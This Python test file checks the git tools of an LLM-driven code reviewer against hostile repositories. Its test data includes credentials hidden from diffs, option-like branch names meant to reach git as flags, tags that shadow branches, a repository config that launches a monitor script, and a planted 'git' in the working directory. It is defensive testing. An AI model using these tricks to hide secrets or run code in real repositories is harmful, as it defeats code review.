"""The git tools, against a real repository: every answer is an envelope, and a wrong branch is a sentence."""

from __future__ import annotations

import asyncio
import importlib
import os
import random
import re
import subprocess
import sys
import time
from pathlib import Path

import pytest
from conftest import (
    BASE,
    HEAD,
    HIDDEN,
    KEY_LINE,
    POINTER,
    SEPARATED,
    UNKNOWN_USER_REPO,
    UNRELATED,
    _branch_off_empty,
    _committed,
    _git_in,
    _link_on_branch,
    _link_staged,
    gathered,
    missing_objects,
    run_review,
    tool_context,
)

#: No git call can finish in a microsecond: this is a real timeout, the process started and killed.
NO_TIME = 1e-6


def _listed_and_shown(repo: Path, head: str, path: str) -> tuple[list[dict], str]:
    """What the chat's tools list on `head`, called in the order a model is told, and `path`'s diff as the review
    reads it: the chat's checks node gathers the change as the command does, over the scope the intake's first tool
    left in state."""
    model_tools = importlib.import_module("adk_review.judge.tools")
    context = tool_context()
    asyncio.run(model_tools.inspect_repository(str(repo), BASE, head, context))
    listed = asyncio.run(model_tools.changed_files(context))["files"]
    scope = context.state[importlib.import_module("adk_review.judge.agents").SCOPE]
    evidence = importlib.import_module("adk_review.collect.git").gather(scope)
    return listed, next(f["diff"] for f in evidence["files"] if f["path"] == path)


def _preflight(repo: str, base: str, head: str) -> dict:
    """The reviewer's own check of a repository and its two branches."""
    return importlib.import_module("adk_review.collect.git").preflight(repo, base, head)


def _twenty_lines(root: Path) -> Path:
    """`main` holding a twenty-line `pay.py`, and `change` adding one line in its middle: three lines of context
    either side, as git prints a diff for no one's settings."""
    repo = root / "repo"
    repo.mkdir()
    _git_in(repo, "init", "-q", "-b", BASE)
    _committed(repo, "pay.py", "".join(f"line_{n} = {n}\n" for n in range(20)), "base")
    _git_in(repo, "checkout", "-q", "-b", "change")
    text = (repo / "pay.py").read_text(encoding="utf-8").replace("line_10 = 10\n", "line_10 = 10\nadded = 1\n")
    _committed(repo, "pay.py", text, "one line")
    return repo


#: A person's own git settings that each changed what the review read, measured before: no context lines, no `a/`
#: and `b/` in the header, or every Python file read as binary, so the gates saw no added line at all.
THEIR_SETTINGS = {
    "GIT_DIFF_OPTS=-u0 in the shell": lambda _repo, _home, env: env.setenv("GIT_DIFF_OPTS", "-u0"),
    "diff.context=0 in their global config": lambda _repo, home, _env: (home / ".gitconfig").write_text(
        "[diff]\n\tcontext = 0\n\tnoprefix = true\n", encoding="utf-8"
    ),
    "*.py -diff in their attributes file": lambda _repo, home, _env: (
        (home / ".config" / "git").mkdir(parents=True),
        (home / ".config" / "git" / "attributes").write_text("*.py -diff\n", encoding="utf-8"),
    ),
    "diff.context=0 in the repository's own config": lambda repo, _home, _env: (
        _git_in(repo, "config", "diff.context", "0"),
        _git_in(repo, "config", "diff.noprefix", "true"),
    ),
}


class TestNoOnesSettings:
    """What git prints for a review is git's default, whoever runs it: every inherited `GIT_*` variable left out, no
    global or system config, no attributes but the repository's, and the diff read through plumbing, which no
    display setting of the repository's own reaches."""

    @pytest.mark.parametrize("setting", THEIR_SETTINGS)
    def test_a_diff_reads_the_same_whatever_their_settings(self, setting: str, tmp_path: Path, monkeypatch) -> None:
        repo, home = _twenty_lines(tmp_path), tmp_path / "home"
        home.mkdir()
        monkeypatch.setenv("HOME", str(home))
        monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)
        _files, theirs_unset = _listed_and_shown(repo, "change", "pay.py")
        THEIR_SETTINGS[setting](repo, home, monkeypatch)
        _files, diff = _listed_and_shown(repo, "change", "pay.py")
        assert diff.startswith("diff --git a/pay.py b/pay.py") and "Binary files" not in diff, diff
        assert diff == theirs_unset, diff
        plain = gathered(repo, "change", guidelines=False)["pay.py"]["diff"]
        assert sum(line.startswith(" ") for line in plain.splitlines()) == 6, "git's three lines, for the rules"

    def test_a_variable_naming_another_repositorys_refs_is_never_inherited(
        self, tmp_path: Path, demo_repo: Path, monkeypatch
    ) -> None:
        """git 2.54's `GIT_REFERENCE_BACKEND` outranks the repository's own config: measured, it answered another
        repository's commit for `main`. A list of variables to leave out missed it; leaving out every `GIT_*` does
        not."""
        repo = _twenty_lines(tmp_path)
        ours = _git_in(repo, "rev-parse", BASE)  # before the variable: the test's own git inherits it too
        monkeypatch.setenv("GIT_REFERENCE_BACKEND", f"files://{demo_repo}/.git")
        context = tool_context()
        out = asyncio.run(
            importlib.import_module("adk_review.judge.tools").inspect_repository(str(repo), BASE, "change", context)
        )
        assert out["status"] == "success" and out["base_sha"] == ours, out


def test_a_tools_docstring_speaks_to_the_model_in_words() -> None:
    """ADK sends a tool's docstring to the model as it is written. Measured by review: `show_diff` told the model its
    diff was "capped at DIFF_CAP_CHARS", a name only the code knows; the cap is a number the model can use."""
    import re

    model_tools = importlib.import_module("adk_review.judge.tools")
    for tool in (model_tools.inspect_repository, model_tools.changed_files):
        assert not re.findall(r"\b[A-Z][A-Z0-9]*_[A-Z0-9_]+\b", tool.__doc__), (tool.__name__, tool.__doc__[:120])


def test_preflight_names_each_ref_as_git_reads_it_and_refuses_what_names_none(tmp_path: Path, monkeypatch) -> None:
    """A commit moves a branch, so a hand-off names one to commit on only where the head names it as itself, in any
    spelling. Read by review: guessed from the ref a name resolved through, `feature~1` passed for `feature`, and
    `HEAD`, `heads/feature` and `refs/heads/feature` did not. Named in full, which no tag of its name makes ambiguous:
    read by review, `x` was refused as ambiguous where the hand-off's check pasted it, a tag named `x` too."""
    from adk_review.collect.git import _branch, _full_ref, preflight

    repo = tmp_path / "repo"
    repo.mkdir()
    _git_in(repo, "init", "-q", "-b", BASE)
    _committed(repo, "a.py")
    _git_in(repo, "checkout", "-q", "-b", "feature")
    tip = _committed(repo, "b.py")
    _git_in(repo, "tag", "v1")
    _git_in(repo, "branch", "x")
    _git_in(repo, "tag", "x")
    spellings = {"feature", "heads/feature", "refs/heads/feature", "HEAD"}
    others = ["feature~0", tip, "v1", f"{BASE}..feature"]  # a range: git answers it, and exit 1
    heads = [*spellings, *others, "heads/x", "refs/heads/x"]
    named = {head: _branch(str(repo), head, _full_ref(str(repo), "head branch", head)) for head in heads}
    expected = dict.fromkeys(spellings, "refs/heads/feature") | dict.fromkeys(others, "")
    assert named == expected | dict.fromkeys(["heads/x", "refs/heads/x"], "refs/heads/x"), named
    assert preflight(str(repo), BASE, "HEAD")["branch"] == "refs/heads/feature", "as `preflight` answers it"
    assert preflight(str(repo), BASE, "refs/heads/x")["status"] == "success", "the name it gives is one it takes"
    _git_in(repo, "tag", "refs/heads/x", BASE)  # a fork's tag so named: git reads a full name as itself first
    _git_in(repo, "tag", "refs/heads/gone", BASE)  # where no branch has the full name, git reads the tag
    assert preflight(str(repo), BASE, "refs/heads/gone")["head_ref"] == "refs/tags/refs/heads/gone", (
        "read by review: read as itself alone, the tag git read went unnamed in the report"
    )
    named = preflight(str(repo), BASE, "refs/heads/x")
    assert named["status"] == "success" and named["head_ref"] == "refs/heads/x", (
        "read by review: refused as ambiguous where a hand-off names a branch in full, and read through the tag"
    )
    assert named["branch"] == "refs/heads/x", "read by review: git, asked, named none, and a fix went to a new branch"
    for flag in ("-x", "--ignore-case", "^main"):  # read by review: a flag reached git, and `^main` named a sha
        said = preflight(str(repo), flag, "feature")["error_message"]
        assert said.startswith(f"base branch {flag!r} is no branch name") and "fetch" not in said, (
            "read by review: told to fetch a name no branch can have"
        )
    said = preflight(str(repo), f"{BASE}~5", "feature")["error_message"]  # a revision past the history it holds
    assert "does not exist" in said and "no branch name" not in said, "read by review: a revision said to be no name"
    said = preflight(str(repo), f"{BASE}..feature", "feature")["error_message"]  # a range, which no ref's name holds
    assert said.startswith(f"base branch '{BASE}..feature' is no branch name"), "read by review: told to fetch a range"
    for bad in ("feat/", "x.lock", "a//b"):  # names `git check-ref-format` refuses: read by review, told to fetch them
        assert preflight(str(repo), bad, "feature")["error_message"].startswith(
            f"base branch {bad!r} is no branch name"
        )
    # A commit git cannot read also exits 128, and says so: read by review, it was called missing. A clone of its own
    # objects, so the original stays whole.
    corrupt = tmp_path / "corrupt"
    _git_in(tmp_path, "clone", "-q", "--no-hardlinks", str(repo), str(corrupt))
    sha = _git_in(corrupt, "rev-parse", "origin/feature")
    (stored := corrupt / ".git" / "objects" / sha[:2] / sha[2:]).chmod(0o644)
    stored.write_bytes(b"garbage")
    for head in ("origin/feature", "origin/feature~1"):  # read by review: a walk through it exits 1, and said so too
        said = preflight(str(corrupt), f"origin/{BASE}", head)["error_message"]
        assert "does not exist" not in said and "rev-parse failed" in said, (head, said)
    from adk_review.collect.git import _environment

    assert _environment(str(repo))["LC_ALL"] == "C", "read by review: proven only where German was installed"
    monkeypatch.setenv("LC_ALL", "de_DE.UTF-8")  # read by review: git's `Fehler:` read as no error, the commit missing
    said = preflight(str(corrupt), f"origin/{BASE}", "origin/feature")["error_message"]
    assert "does not exist" not in said and "rev-parse failed: error:" in said, said
    said = preflight(str(repo), f"{BASE}@{{9}}", "feature")["error_message"]  # past its reflog: git's exit 128
    assert "Name a commit it holds" in said and "exit 128" not in said, "read by review: it named no step to take"
    _git_in(repo, "checkout", "-q", "--detach")
    assert preflight(str(repo), BASE, "HEAD")["branch"] == "", "a detached head, as CI checks out, is no branch"


class TestInspectRepository:
    def test_a_missing_branch_is_an_error_envelope_not_an_exception(self, demo_repo: Path) -> None:
        """The commonest typo. Measured by coverage: the reviewer answered it in no test."""
        model_tools = importlib.import_module("adk_review.judge.tools")
        context = (tool_context(),)
        out = asyncio.run(model_tools.inspect_repository(str(demo_repo), "main", "feature/does-not-exist", *context))
        assert out["status"] == "error" and "feature/does-not-exist" in out["error_message"], out

    def test_a_directory_that_is_not_a_repository_is_named(self, tmp_path: Path) -> None:
        model_tools = importlib.import_module("adk_review.judge.tools")
        context = (tool_context(),)
        out = asyncio.run(model_tools.inspect_repository(str(tmp_path), "main", "main", *context))
        assert out["status"] == "error" and "not a git repository" in out["error_message"], out

    def test_a_home_of_a_user_this_machine_does_not_know_is_an_error_envelope(self) -> None:
        """`~name` for a user that does not exist is left as typed, so the repository check answers; `Path.expanduser`
        raised here once, and a tool never raises at the model."""
        model_tools = importlib.import_module("adk_review.judge.tools")
        context = (tool_context(),)
        out = asyncio.run(model_tools.inspect_repository(UNKNOWN_USER_REPO, "main", "main", *context))
        assert out["status"] == "error" and UNKNOWN_USER_REPO in out["error_message"], out


class TestTheScopeLivesInState:
    """One tool's answer is the next tool's boundary: `inspect_repository` leaves the scope it confirmed in
    session state, and `changed_files` reads it and takes no repository at all. Measured in
    chat mode before this: every tool resolved the repository again, twenty-nine git processes where nine would do."""

    def test_a_long_list_of_changed_files_is_cut_where_a_model_reads_it_and_whole_where_code_does(
        self, demo_repo: Path, monkeypatch
    ) -> None:
        """Every string a model reads is capped. Measured before: the list was not, so a change of thousands of files
        filled the context with paths. The cut is named; the count and `show_diff`'s allowlist stay whole."""
        model_tools = importlib.import_module("adk_review.judge.tools")
        monkeypatch.setattr(model_tools, "LISTED_MAX_CHARS", len("src/payments/charge.py") + 1)
        context = tool_context()
        assert asyncio.run(model_tools.inspect_repository(str(demo_repo), BASE, HEAD, context))["status"] == "success"
        out = asyncio.run(model_tools.changed_files(context))
        assert [f["path"] for f in out["files"]] == ["src/payments/charge.py"] and out["count"] == 4, out
        assert out["cut"].startswith("3 more file(s) not listed"), out

    def test_a_failed_call_clears_the_scope_never_the_conversations_repository(self, demo_repo: Path) -> None:
        """The guardrail holds a conversation to the repository it first confirmed; a call that fails after it must
        not free the model to name another."""
        model_tools, agents = (importlib.import_module(f"adk_review.judge.{name}") for name in ("tools", "agents"))
        context = tool_context()
        assert asyncio.run(model_tools.inspect_repository(str(demo_repo), BASE, HEAD, context))["status"] == "success"
        assert (
            asyncio.run(model_tools.inspect_repository(str(demo_repo), BASE, "no-such-branch", context))["status"]
            == "error"
        )
        assert context.state[agents.SCOPE] is None and context.state[agents.REPOSITORY] == str(demo_repo)

    def test_a_renamed_file_is_read_as_the_lines_it_moved_and_changed(self, hostile_repo: Path) -> None:
        """Measured before: `show_diff` read a rename by its new path alone, so a renamed file with one change read
        as every line added, the change among them unmarked."""
        files, diff = _listed_and_shown(hostile_repo, "renamed", "money_rates.py")
        assert files == [{"path": "money_rates.py", "status": "R", "old": "rates.py"}]
        assert "rename from rates.py" in diff and "new file mode" not in diff, diff[:400]
        assert [line for line in diff.splitlines() if line.startswith("+") and not line.startswith("+++")] == [
            "+added = 1"
        ]

    def test_a_rename_reads_its_own_pair_even_where_its_old_name_is_now_a_folder(self, hostile_repo: Path) -> None:
        """Measured before: `a` renamed to `b.py` beside a new `a/x.py` holding a key, and `-- a b.py` matched
        everything under `a/` too, so `b.py`'s diff carried `a/x.py`'s key, a finding at a line `b.py` never had."""
        _files, diff = _listed_and_shown(hostile_repo, "folded", "notes.txt")
        assert "rename from notes.md" in diff and "notes.md/x.py" not in diff and "AKIA" not in diff, diff
        evidence = importlib.import_module("adk_review.collect.git").collect_evidence(str(hostile_repo), BASE, "folded")
        moved = next(f for f in evidence["files"] if f["path"] == "notes.txt")
        assert "notes.md/x.py" not in moved["diff"] and moved["added"] == [], moved

    @pytest.mark.parametrize("variable", ["GIT_LITERAL_PATHSPECS", "GIT_ICASE_PATHSPECS", "GIT_GLOB_PATHSPECS"])
    def test_a_path_is_read_as_itself_whatever_the_shell_says_of_pathspecs(
        self, variable: str, hostile_repo: Path, monkeypatch
    ) -> None:
        """git reads four variables that change what a path means; the reviewer's own run is the one it asked for.
        Measured before: `GIT_ICASE_PATHSPECS=1` gave `a.py`'s diff `A.py`'s lines too."""
        monkeypatch.setenv(variable, "1")
        _files, diff = _listed_and_shown(hostile_repo, "twins", "t.py")
        assert "+lower = 1" in diff and "AKIA" not in diff, diff

    def test_a_backslash_in_a_name_is_part_of_the_name(self, hostile_repo: Path) -> None:
        """Git for Windows reads `\\` in a pathspec as a folder's separator unless the path is from the top: a branch
        made elsewhere with `cfg\\keys.py` beside `cfg/keys.py` had the second's diff shown for the first, and the key
        in the first read by no gate and no lane."""
        _files, diff = _listed_and_shown(hostile_repo, "backslash", "cfg\\keys.py")
        assert "AKIA" in diff and "slash = 1" not in diff, diff
        specs = importlib.import_module("adk_review.collect.git")._literally("cfg\\keys.py")
        assert all(spec.startswith(":(top,") for spec in specs), "from the top, git leaves a path as spelled"


class TestGitPastItsTimeout:
    """Every git call carries a timeout, and a call past it is killed. Measured before this: `TimeoutExpired` rose
    through every tool, at the model, and through every command as a traceback. And several helpers read git's
    answer without its exit code, so a timeout answered as an empty one would have read as an empty change."""

    def test_every_tool_answers_a_timeout_with_an_envelope_naming_it(self, demo_repo: Path, monkeypatch) -> None:
        git, model_tools = (
            importlib.import_module(name) for name in ("adk_review.collect.git", "adk_review.judge.tools")
        )
        context = tool_context()
        scope = (str(demo_repo), BASE, HEAD, context)
        assert asyncio.run(model_tools.inspect_repository(*scope))["status"] == "success"
        monkeypatch.setattr(git, "GIT_TIMEOUT_S", NO_TIME)
        # `changed_files` before the preflight, which clears the scope it fails.
        answers = [asyncio.run(model_tools.changed_files(context)), asyncio.run(model_tools.inspect_repository(*scope))]
        assert all(a["status"] == "error" and "did not answer within" in a["error_message"] for a in answers), answers

    def test_every_command_names_a_timeout_and_exits_2_before_any_model(
        self, demo_repo: Path, monkeypatch, cli, capsys
    ) -> None:
        monkeypatch.setattr(importlib.import_module("adk_review.collect.git"), "GIT_TIMEOUT_S", NO_TIME)
        assert run_review(cli, demo_repo) == 2
        err = capsys.readouterr().err
        assert "did not answer within" in err and "Traceback" not in err, err

    @pytest.mark.skipif(os.name != "nt", reason="off Windows `run` never read a killed command's output to its end")
    def test_a_timeout_stops_what_the_command_started_too(self, monkeypatch) -> None:
        """Git for Windows' `git.exe` runs the real git as its child. `subprocess.run` kills the first and then, on
        Windows, reads the output to its end, which the child holds open: a git past its timeout hung the review.
        A command that starts a child holding its output stands in for it."""
        git = importlib.import_module("adk_review.collect.git")
        monkeypatch.setattr(git, "GIT_TIMEOUT_S", 1)
        child = "import time; time.sleep(20)"
        parent = f"import subprocess, sys, time; subprocess.Popen([sys.executable, '-c', {child!r}]); time.sleep(20)"
        started = time.monotonic()
        with pytest.raises(subprocess.TimeoutExpired):
            git._run([sys.executable, "-c", parent], dict(os.environ))
        assert time.monotonic() - started < 10, "waited for the child, not the timeout"

    def test_git_is_found_on_path_never_in_the_current_directory(self, tmp_path, monkeypatch) -> None:
        """Windows looks for a program in the current directory before PATH, and the current directory can be the
        checkout under review: its own `git.exe` would run. Git is run by its full path, as PATH finds it."""
        git = importlib.import_module("adk_review.collect.git")
        program = tmp_path / ("git.exe" if os.name == "nt" else "git")  # a program of that name, empty: never run
        program.touch()
        program.chmod(0o755)
        monkeypatch.chdir(tmp_path)
        git._found.cache_clear()  # looked up now, from here: never an answer cached before
        found = Path(git.on_path("git"))  # lent to the lint rule too
        assert found.is_absolute() and found.parent != tmp_path, found

    def test_a_relative_or_empty_path_entry_is_never_searched(self, tmp_path, monkeypatch) -> None:
        """An empty entry of PATH, or a relative one such as `.`, names the current directory, which can be the
        checkout under review. Measured before: with `PATH=.:…`, the preflight ran a `git` from the folder the review
        started in."""
        git = importlib.import_module("adk_review.collect.git")
        program = tmp_path / ("git.exe" if os.name == "nt" else "git")  # a program of that name, empty: never run
        program.touch()
        program.chmod(0o755)
        monkeypatch.chdir(tmp_path)
        monkeypatch.setenv("PATH", os.pathsep.join([".", "", "bin", os.environ.get("PATH", "")]))
        git._found.cache_clear()
        found = Path(git.on_path("git"))
        assert found.is_absolute() and found.parent != tmp_path, found

    def test_a_folder_whose_git_is_no_repository_is_refused_never_its_parent_reviewed(self, tmp_path) -> None:
        """A `.git` that is no repository, an empty folder say, sends git looking further up. Measured before: the
        review read the outer repository's commits under the inner folder's name."""
        outer, inner = tmp_path / "outer", tmp_path / "outer" / "inner"
        inner.mkdir(parents=True)
        for args in (["init", "-q", "-b", "main"], ["commit", "-q", "--allow-empty", "-m", "the outer one's"]):
            _git_in(outer, *args)
        (inner / ".git").mkdir()
        resolved = _preflight(str(inner), "main", "main")
        assert resolved["status"] == "error" and "is no repository's top" in resolved["error_message"], resolved

    def test_a_repository_typed_in_another_case_is_its_top_where_the_file_system_ignores_case(
        self, demo_repo: Path
    ) -> None:
        """Measured before: the top git named and the folder typed were compared as strings, so on macOS a repository
        typed in another case was refused as no repository's top."""
        other = str(demo_repo).swapcase()
        if not Path(other).is_dir():
            pytest.skip("this file system tells letter cases apart")
        assert _preflight(other, BASE, HEAD)["status"] == "success"

    @pytest.mark.skipif(os.name == "nt", reason="Windows drops a folder name's closing space and holds no tab")
    def test_a_repository_whose_folder_name_ends_in_a_space_is_its_top(self, tmp_path: Path) -> None:
        """A folder's name may end in a space, a tab or U+00A0, which git's answer trimmed loses. Measured by review:
        such a repository was refused as no repository's top, and the pre-push hook stopped every push from it."""
        for ending in (" ", "\t", chr(0xA0)):
            repo = _branch_off_empty(tmp_path / f"repo{ending}", "feature")
            assert _preflight(str(repo), BASE, "feature")["status"] == "success", repr(ending)

    @pytest.mark.skipif(os.name == "nt", reason="a POSIX shell script stands in for the monitor program")
    def test_the_reviewed_repositorys_file_system_monitor_never_starts(self, tmp_path) -> None:
        """`core.fsmonitor` names a program git starts beside a diff. A branch cannot set it, but a repository someone
        prepared, or a workspace where the change's own code ran first, can. Measured before: `diff-tree` started it in
        the review's environment, provider keys and all."""
        git = importlib.import_module("adk_review.collect.git")
        repo, marker = _branch_off_empty(tmp_path / "repo", "change"), tmp_path / "started"
        _committed(repo, "a.py")
        monitor = tmp_path / "monitor.sh"
        monitor.write_text(f"#!/bin/sh\necho started >> '{marker}'\n", encoding="utf-8", newline="\n")
        monitor.chmod(0o755)
        _git_in(repo, "config", "core.fsmonitor", str(monitor))
        git._git(str(repo), "diff-tree", "-r", "--name-only", "HEAD~1", "HEAD")
        git._git(str(repo), "diff-tree", "-r", "-p", "HEAD~1", "HEAD")
        assert not marker.exists(), "the repository's own monitor program ran"

    def test_git_not_on_path_is_a_named_error(self, demo_repo: Path, tmp_path, monkeypatch) -> None:
        """Measured before: with no git on PATH — Git for Windows can be installed for Git Bash alone — every
        command ended in a traceback and exit 1, the blocker's code."""
        model_tools = importlib.import_module("adk_review.judge.tools")
        monkeypatch.setenv("PATH", str(tmp_path))
        scope = (str(demo_repo), BASE, HEAD, tool_context())
        answer = asyncio.run(model_tools.inspect_repository(*scope))
        assert answer["status"] == "error" and "install git with its folder on PATH" in answer["error_message"], answer

    def test_a_diff_past_its_timeout_after_a_good_preflight_is_named_never_an_empty_change(
        self, demo_repo: Path, monkeypatch
    ) -> None:
        git = importlib.import_module("adk_review.collect.git")
        run = git._run

        def only_the_diff_times_out(argv, *args, **kwargs):
            if "diff-tree" in argv and "-p" in argv:  # one file's patch, never the list of changed files
                raise subprocess.TimeoutExpired(argv, NO_TIME)
            return run(argv, *args, **kwargs)

        monkeypatch.setattr(git, "_run", only_the_diff_times_out)
        out = git.collect_evidence(str(demo_repo), BASE, HEAD)
        assert out["status"] == "error" and "git diff-tree did not answer within" in out["error_message"], out


class TestGitThatFails:
    """A git call that fails is named, never read as an empty answer. Measured before this: the review
    approved, exit 0, a branch sharing no history with main (no merge base, so no file listed) and a partial clone
    whose origin had gone (every diff empty) — each carrying a change it had not read."""

    def test_every_tool_names_a_branch_sharing_no_history(self, unrelated_repo: Path) -> None:
        model_tools = importlib.import_module("adk_review.judge.tools")
        scoped = (tool_context(),)
        out = asyncio.run(model_tools.inspect_repository(str(unrelated_repo), BASE, UNRELATED, *scoped))
        assert out["status"] == "error" and "share no history" in out["error_message"], out
        assert set(out) == {"status", "error_message"}, "read by review: the command's mark, beside what chat is told"

    @pytest.mark.parametrize("clone", ["shallow_clone", "misled_clone"])
    def test_every_tool_refuses_a_shallow_clone(self, clone: str, request) -> None:
        """Before any merge base is asked for: at depth 1 `merge-base` answers 1, as for no shared history, and in
        the misled clone it answers with the wrong commit."""
        model_tools = importlib.import_module("adk_review.judge.tools")
        scoped = (tool_context(),)
        out = asyncio.run(model_tools.inspect_repository(str(request.getfixturevalue(clone)), BASE, HEAD, *scoped))
        assert out["status"] == "error" and "shallow clone" in out["error_message"], out
        assert "share no history" not in out["error_message"], out

    def test_every_command_names_a_branch_sharing_no_history(self, unrelated_repo: Path, cli, capsys) -> None:
        assert cli.main([str(unrelated_repo), "--base", BASE, "--head", UNRELATED]) == 2
        err = capsys.readouterr().err
        assert "share no history" in err and "with --all, not --base" in err and "Traceback" not in err, err

    def test_the_mark_that_rescopes_a_change_is_set_only_where_it_is_true(self, unrelated_repo: Path) -> None:
        """The command names the flags that rescope a change from the envelope's mark alone. Read by review: every
        other error carried it, as false."""
        from adk_review.collect.git import collect_evidence

        assert collect_evidence(str(unrelated_repo), BASE, UNRELATED).get("rescope") is True
        assert "rescope" not in collect_evidence(str(unrelated_repo), BASE, "gone")

    def test_every_command_names_a_shallow_clone_and_how_to_deepen_it(self, shallow_clone: Path, cli, capsys) -> None:
        assert run_review(cli, shallow_clone) == 2
        err = capsys.readouterr().err
        assert "shallow clone" in err and "git fetch --unshallow" in err and "Traceback" not in err, err

    @pytest.mark.parametrize("clone", ["cut_off_clone", "partial_clone"])
    def test_a_diff_git_could_not_read_is_named_never_approved(self, clone: str, request, cli, capsys) -> None:
        repo = request.getfixturevalue(clone)
        missing = missing_objects(repo)
        assert run_review(cli, repo) == 2
        err = capsys.readouterr().err
        assert "git diff-tree failed: " in err and "Traceback" not in err, err
        assert missing_objects(repo) == missing, "a lazy fetch wrote into the repository under review"


class TestWhatARefNames:
    """A name resolves to one commit or is refused. Measured before: a fork's tag `main`, on its own head, won over
    the branch `main` — git prefers a tag, and `rev-parse --quiet` hid its "ambiguous" warning — so the base was the
    head, and the review approved, exit 0, a change it had read none of."""

    @pytest.mark.parametrize("spelling", ["twin", "twin~0", "twin^0", "a tag spelled as a short sha", *SEPARATED])
    def test_every_tool_refuses_a_name_that_means_two_things(self, spelling: str, hostile_repo: Path) -> None:
        """However it is spelled: before, `twin~0` named no ref and passed, and a tag named as a commit's short sha
        won over that commit, git preferring a ref to an abbreviated object without a word under `--quiet`; and,
        measured by review, a name holding U+2028 or U+0085 was not refused, the tag's commit read as the branch's."""
        if spelling.startswith("a tag"):
            spelling = _git_in(hostile_repo, "rev-parse", "carriage")[:7]
        model_tools = importlib.import_module("adk_review.judge.tools")
        scoped = (tool_context(),)
        out = asyncio.run(model_tools.inspect_repository(str(hostile_repo), BASE, spelling, *scoped))
        assert out["status"] == "error" and f"{spelling!r} is ambiguous" in out["error_message"], out

    def test_every_command_refuses_an_ambiguous_base(self, hostile_repo: Path, cli, capsys) -> None:
        assert cli.main([str(hostile_repo), "--base", "twin", "--head", "carriage"]) == 2
        err = capsys.readouterr().err
        assert "'twin' is ambiguous" in err and "Traceback" not in err, err

    def test_an_annotated_tag_names_the_commit_it_tags(self, hostile_repo: Path) -> None:
        """Measured before: the head's sha was the tag object's, a sha no reader of the report could check out."""
        model_tools = importlib.import_module("adk_review.judge.tools")
        scoped = (tool_context(),)
        out = asyncio.run(model_tools.inspect_repository(str(hostile_repo), BASE, "v1", *scoped))
        assert out["status"] == "success" and out["head_sha"] == _git_in(hostile_repo, "rev-parse", "carriage"), out

    def test_a_name_that_is_only_a_tag_is_named_as_one(self, hostile_repo: Path, cli, capsys) -> None:
        """Git resolves a name that is only a tag to it, as it must for `--base v1.0`, so a fork's tag `origin/main`,
        with no such branch fetched, stood in for the branch unseen: the report now says which tag it read."""
        cli.main([str(hostile_repo), "--base", "release/base", "--head", "carriage"])
        header = [line for line in capsys.readouterr().out.splitlines() if line.startswith("- against")]
        assert header and "release/base (the tag refs/tags/release/base) @ " in header[0], header
        cli.main(
            [str(hostile_repo), "--base", "refs/tags/release/base", "--head", "carriage"]
        )  # as a hand-off names it
        header = [line for line in capsys.readouterr().out.splitlines() if line.startswith("- against")]
        assert header and "against      refs/tags/release/base @ " in header[0], "read by review: named twice"


@pytest.fixture
def reviewers_git_config(tmp_path: Path, monkeypatch) -> None:
    """The reviewer's own global git config, as a diff tool or a terminal setup leaves it: colour always on, and an
    external diff (`cat` here: any command that prints something other than a unified diff)."""
    config = tmp_path / "gitconfig"
    settings = "[color]\n\tui = always\n[diff]\n\texternal = cat\n\tsuppressBlankEmpty = true\n"
    config.write_text(settings, encoding="utf-8")
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(config))


class TestWhatABranchCannotHide:
    """Every file's diff is read as git prints it for no one's settings. Measured before, each APPROVED, exit 0, with
    the planted key unread: a path git took as pathspec magic (`:config.py`, an empty diff), the branch's own
    `.gitattributes` marking the key's file `-diff` ("Binary files differ"), and the reviewer's `color.ui=always` or
    `diff.external`, whose output no hunk header could be read from."""

    @pytest.mark.parametrize("branch", ["pathspec", "attributes", "nfd"])
    def test_every_tool_shows_the_lines_the_branch_hid(self, branch: str, hostile_repo: Path) -> None:
        _files, diff = _listed_and_shown(hostile_repo, branch, HIDDEN[branch])
        assert f"+{KEY_LINE.strip()}" in diff, diff

    @pytest.mark.usefixtures("reviewers_git_config")
    def test_every_tool_reads_past_the_reviewers_git_config(self, demo_repo: Path) -> None:
        _files, diff = _listed_and_shown(demo_repo, HEAD, "src/payments/charge.py")
        assert diff.startswith("diff --git") and "\n@@ " in diff and "\x1b[" not in diff, diff

    @pytest.mark.parametrize("branch", list(HIDDEN))
    def test_a_key_the_branch_hid_is_found_where_it_is_and_blocks(
        self, branch: str, hostile_repo: Path, cli, capsys
    ) -> None:
        """A lone carriage return too: before, it split one line of the file in two, and the key after it was no
        added line, so the gate never read it."""
        assert cli.main([str(hostile_repo), "--base", BASE, "--head", branch]) == 1
        out = capsys.readouterr().out
        assert "hard-coded credential" in out and f"({HIDDEN[branch]}:1)" in out, out

    def test_the_lanes_read_no_line_break_but_newline(self, hostile_repo: Path) -> None:
        """A form feed, a lone `\\r` or U+2028 starts a line for a reader and for `str.splitlines`, with no diff
        marker: the key hid behind one, and text after one read as the prompt's own. Each is shown as its escape."""
        git = importlib.import_module("adk_review.collect.git")
        evidence = git.collect_evidence(str(hostile_repo), BASE, "carriage")
        assert evidence["diff"].splitlines() == evidence["diff"].split("\n"), "a line break the lanes would see"
        assert '+REGION = "eu"\\r AWS_ACCESS_KEY_ID' in evidence["diff"], "the escape, on the line it was on"

    @pytest.mark.parametrize("brk", ["\r", "\u2028"], ids=["lone CR", "U+2028"])
    def test_a_key_opening_a_line_after_a_lone_break_is_found_and_never_sent(self, brk: str, tmp_path: Path) -> None:
        """Measured by review: a file broken at a lone `\\r` or U+2028, shown as the break's escape glued to the key
        that opened the next line, matched no shape that opens on a word's edge: no rule found it, and redaction let it
        through to the model."""
        from adk_review.collect.git import collect_evidence
        from adk_review.core.secrets import scrub
        from adk_review.judge.checks import run_rules
        from adk_review.judge.rules.secrets import Secrets

        token = "ghp_" + "a1B2" * 9
        repo = _branch_off_empty(tmp_path / "repo", HEAD)
        _committed(repo, "deploy-keys.txt", f"# deploy keys{brk}{token}\n".encode())
        evidence = collect_evidence(str(repo), BASE, HEAD)
        assert token not in scrub(evidence["diff"])[0], "never sent to a model"
        assert run_rules(evidence, [Secrets()])["rule.secrets"].findings, "found"

    @pytest.mark.usefixtures("reviewers_git_config")
    def test_the_reviewers_git_config_moves_no_line(self, hostile_repo: Path, cli, capsys) -> None:
        """`diff.suppressBlankEmpty` prints a blank context line as nothing at all: measured before, the gate put the
        key a line early, at `settings.py:3`."""
        assert cli.main([str(hostile_repo), "--base", BASE, "--head", "blank"]) == 1
        assert "(settings.py:4)" in capsys.readouterr().out

    @pytest.mark.usefixtures("reviewers_git_config")
    def test_the_reviewers_git_config_hides_nothing(self, demo_repo: Path, cli, capsys) -> None:
        assert run_review(cli, demo_repo) == 1
        assert "hard-coded credential" in capsys.readouterr().out


